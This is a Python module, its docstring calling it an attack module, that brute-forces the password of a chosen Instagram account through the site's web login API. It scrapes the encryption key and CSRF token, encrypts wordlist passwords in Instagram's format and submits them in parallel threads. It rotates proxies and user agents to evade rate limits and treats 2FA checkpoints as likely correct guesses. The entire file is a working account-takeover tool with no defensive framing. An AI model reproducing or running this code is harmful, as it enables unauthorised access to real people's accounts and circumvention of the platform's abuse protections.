"""Instagram login attack module — وحدة الهجوم.

يتعامل مع تشفير كلمة المرور (libsodium sealed box) وCSRF tokens
بشكل صحيح مع Instagram API.
"""

import time
import json
import base64
import random
import re
from typing import Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

import requests
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.table import Table

console = Console()
print_lock = Lock()

# ── Instagram API endpoints ─────────────────────────────────────────
BASE_URL = "https://www.instagram.com"
LOGIN_URL = f"{BASE_URL}/api/v1/web/accounts/login/ajax/"
LOGIN_PAGE = f"{BASE_URL}/accounts/login/"


class InstagramAttacker:
    """Handles Instagram login attempts with proper encryption & session management."""

    def __init__(self, username: str, password_list: List[str],
                 proxy_file: Optional[str] = None, threads: int = 5,
                 delay: float = 2.0):
        self.target_username = username
        self.password_list = password_list
        self.proxies = self._load_proxies(proxy_file)
        self.threads = min(threads, 10)
        self.delay = delay
        self.found_password: Optional[str] = None
        self.attempts = 0
        self.lockouts = 0
        self.results: List[dict] = []

    def _load_proxies(self, proxy_file: Optional[str]) -> list:
        if not proxy_file:
            return []
        try:
            with open(proxy_file) as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except FileNotFoundError:
            return []

    # ── Instagram Password Encryption ────────────────────────────
    def _fetch_encryption_params(self, session: requests.Session) -> Tuple[str, str, str]:
        """
        Fetch Instagram's password encryption public key from login page.
        Returns (key_id, public_key_b64, key_version).
        """
        resp = session.get(LOGIN_PAGE, timeout=15)
        resp.raise_for_status()

        # Extract from window._sharedData
        match = re.search(r'window\._sharedData\s*=\s*({.*?});', resp.text, re.DOTALL)
        if match:
            data = json.loads(match.group(1))
            enc = data.get("entry_data", {}).get("LoginAndSignup", [{}])[0].get("encryption", {})
            if enc:
                return (
                    str(enc.get("key_id", "0")),
                    enc.get("public_key", ""),
                    str(enc.get("version", "10")),
                )

        # Fallback: try to find in <script> tags
        match2 = re.search(r'"encryption":\s*({[^}]+})', resp.text)
        if match2:
            enc = json.loads(match2.group(1))
            return (
                str(enc.get("key_id", "0")),
                enc.get("public_key", ""),
                str(enc.get("version", "10")),
            )

        # Default — may fail for some accounts
        raise RuntimeError("Could not extract Instagram encryption parameters from login page.")

    def _encrypt_password(self, password: str, public_key_b64: str,
                          key_id: str, version: str) -> str:
        """
        Encrypt password using Instagram's libsodium sealed box method.
        """
        try:
            import pysodium
        except ImportError:
            # Fallback: use nacl or pynacl
            try:
                import nacl.public
                import nacl.utils

                pubkey_bytes = base64.b64decode(public_key_b64)
                sealed_box = nacl.public.SealedBox(nacl.public.PublicKey(pubkey_bytes))
                encrypted = sealed_box.encrypt(password.encode("utf-8"))
                encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
                return f"#PWD_INSTAGRAM:{version}:{int(time.time())}:{encrypted_b64}"
            except ImportError:
                raise RuntimeError(
                    "Need pysodium or PyNaCl for password encryption.\n"
                    "Install: pip install pysodium   OR   pip install pynacl"
                )

        pubkey_bytes = base64.b64decode(public_key_b64)
        encrypted = pysodium.crypto_box_seal(password.encode("utf-8"), pubkey_bytes)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")

        return f"#PWD_INSTAGRAM:{version}:{int(time.time())}:{encrypted_b64}"

    # ── CSRF Token ────────────────────────────────────────────────
    def _get_csrf(self, session: requests.Session) -> Optional[str]:
        """Extract csrftoken from cookies."""
        return session.cookies.get("csrftoken")

    def _get_rollout_hash(self, session: requests.Session) -> Optional[str]:
        """Get X-Instagram-AJAX rollout hash from login page."""
        try:
            resp = session.get(LOGIN_PAGE, timeout=15)
            match = re.search(r'"rollout_hash":"([^"]+)"', resp.text)
            if match:
                return match.group(1)
        except Exception:
            pass
        return None

    # ── Login Attempt ─────────────────────────────────────────────
    def _attempt_login(self, password: str, proxy: Optional[str] = None,
                       session: Optional[requests.Session] = None) -> dict:
        """
        Single login attempt against Instagram API.
        Returns dict with 'success', 'message', 'password', 'response'.
        """
        if session is None:
            session = requests.Session()

        # Setup session
        session.headers.update({
            "User-Agent": random.choice([
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            ]),
            "X-IG-App-ID": "936619743392459",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.instagram.com/accounts/login/",
        })

        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        try:
            # Step 1 — Fetch login page & encryption params
            enc_key_id, enc_pubkey, enc_version = self._fetch_encryption_params(session)
            csrf = self._get_csrf(session)
            rollout = self._get_rollout_hash(session)

            if not csrf:
                return {"success": False, "message": "No CSRF token", "password": password}

            # Step 2 — Encrypt password
            encrypted_pwd = self._encrypt_password(password, enc_pubkey, enc_key_id, enc_version)

            # Step 3 — Build login request
            headers = {
                "X-CSRFToken": csrf,
                "X-Instagram-AJAX": rollout or "1",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.instagram.com",
            }

            data = {
                "enc_password": encrypted_pwd,
                "username": self.target_username,
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "stopDeletionNonce": "",
                "trustedDeviceRecords": "{}",
            }

            # Step 4 — Send login request
            resp = session.post(LOGIN_URL, headers=headers, data=data, timeout=20)

            try:
                result = resp.json()
            except json.JSONDecodeError:
                return {"success": False, "message": f"Non-JSON response: {resp.status_code}",
                        "password": password, "response": resp.text[:300]}

            # Step 5 — Parse response
            authenticated = result.get("authenticated", False)
            user = result.get("user", False)
            status = result.get("status", "")

            if authenticated and user:
                return {"success": True, "message": "LOGIN SUCCESS", "password": password,
                        "response": result}

            # Check for specific error messages
            if "checkpoint_required" in result:
                return {"success": "checkpoint", "message": "Checkpoint/2FA required",
                        "password": password, "response": result}
            if "rate" in str(result).lower() or status == "fail":
                return {"success": "rate_limited", "message": "Rate limited",
                        "password": password}
            if "invalid" in str(result).lower():
                return {"success": False, "message": "Invalid password", "password": password}

            return {"success": False, "message": result.get("message", status or "Unknown"),
                    "password": password}

        except requests.exceptions.ProxyError:
            return {"success": "proxy_fail", "message": "Proxy error", "password": password}
        except requests.exceptions.ConnectionError:
            return {"success": "conn_error", "message": "Connection error", "password": password}
        except requests.exceptions.Timeout:
            return {"success": "timeout", "message": "Timeout", "password": password}
        except Exception as e:
            return {"success": "error", "message": str(e)[:200], "password": password}

    # ── Main Attack Loop ──────────────────────────────────────────
    def attack(self) -> Optional[str]:
        """Run the full password attack."""
        total = len(self.password_list)
        console.print(f"\n[bold red]⚡ Starting attack on @{self.target_username}[/bold red]")
        console.print(f"[dim]  Passwords: {total} | Threads: {self.threads} | Delay: {self.delay}s[/dim]")
        if self.proxies:
            console.print(f"[dim]  Proxies loaded: {len(self.proxies)}[/dim]")
        console.print()

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[cyan]{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("[red]Brute-forcing...", total=total)

            # Divide passwords into chunks for threading
            chunk_size = max(1, total // self.threads)
            chunks = [
                self.password_list[i:i + chunk_size]
                for i in range(0, total, chunk_size)
            ]

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for chunk in chunks:
                    futures.append(executor.submit(self._worker_chunk, chunk, progress, task))

                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        self.found_password = result
                        # Cancel remaining... (best effort)
                        for f in futures:
                            f.cancel()
                        break

        if self.found_password:
            console.print(f"\n[bold green]🏆 PASSWORD FOUND: {self.found_password}[/bold green]")
        else:
            console.print(f"\n[yellow][!] Password not found in wordlist.[/yellow]")

        return self.found_password

    def _worker_chunk(self, passwords: List[str], progress, task) -> Optional[str]:
        """Worker thread: try passwords from chunk."""
        proxy = None
        session = None

        for i, password in enumerate(passwords):
            if self.found_password:
                return None

            # Rotate proxy every N attempts
            if self.proxies and i % 15 == 0:
                proxy = random.choice(self.proxies)
                session = requests.Session()  # fresh session

            result = self._attempt_login(password, proxy=proxy, session=session)

            with print_lock:
                self.attempts += 1
                progress.update(task, advance=1,
                                description=f"[red]Trying: {password[:20]:<20}...[/red]")

            if result["success"] is True:
                self.found_password = password
                return password

            if result["success"] == "checkpoint":
                # 2FA required — password may be correct!
                with print_lock:
                    console.print(f"\n[yellow][!] Possible correct password (2FA/checkpoint): {password}[/yellow]")
                # Continue trying...

            if result["success"] == "rate_limited":
                self.lockouts += 1
                with print_lock:
                    console.print(f"\n[dim][!] Rate limited — sleeping 30s...[/dim]")
                time.sleep(30)
                session = requests.Session()

            # Respect delay
            time.sleep(self.delay + random.uniform(0, 0.5))

        return None

    def display_summary(self):
        """Show attack summary table."""
        table = Table(title="📊 Attack Summary")
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        table.add_row("Target", f"@{self.target_username}")
        table.add_row("Passwords tried", str(self.attempts))
        table.add_row("Rate limits hit", str(self.lockouts))
        table.add_row("Password found", self.found_password or "❌ Not found")
        console.print(table)
